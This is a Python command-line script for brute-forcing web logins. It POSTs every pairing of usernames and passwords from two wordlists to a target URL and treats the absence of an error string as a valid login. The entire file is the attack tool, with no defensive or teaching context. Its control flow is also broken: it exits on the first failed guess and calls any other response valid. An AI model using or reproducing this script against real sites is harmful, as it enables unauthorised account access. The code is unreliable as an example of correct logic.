import argparse
import requests
import itertools
import sys

needle = "Invalid username or password"

def main():
    parser = argparse.ArgumentParser(description='Brute force login')
    parser.add_argument('target', help='target URL')
    parser.add_argument('usernames', help='file containing usernames (one per line)')
    parser.add_argument('passwords', help='file containing passwords (one per line)')
    args = parser.parse_args()

    usernames = [line.strip() for line in open(args.usernames)]
    with open(args.passwords) as f:
        passwords = [line.strip() for line in f]

    for username, password in itertools.product(usernames, passwords):
        sys.stdout.write("[X] Attempting user:password -> {}:{}".format(username, password))
        sys.stdout.flush()
        r = requests.post(args.target, data={"username": username, "password": password})
        if needle in r.content.decode():
            sys.stdout.write("\n[X] Invalid username or password -> {}:{}".format(username, password))
            sys.exit()
        else:
            sys.stdout.write("\n[X] Valid username and password -> {}:{}".format(username, password))

if __name__=='__main__':
    main()